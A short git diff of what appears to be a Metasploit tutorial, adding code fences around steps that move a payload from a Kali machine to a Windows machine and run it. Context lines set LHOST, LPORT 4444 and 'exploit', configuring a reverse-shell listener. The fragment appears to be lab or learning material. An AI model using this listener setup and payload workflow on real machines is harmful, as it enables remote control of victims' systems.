@@ -36,6 +36,8 @@ set LHOST 2.0.0.4
 set LPORT 4444  
 exploit
 ``` 
+```bash
 making changes kali to windows machine
 next run the payload from windows machine
 making changes windows to kali machine
+```
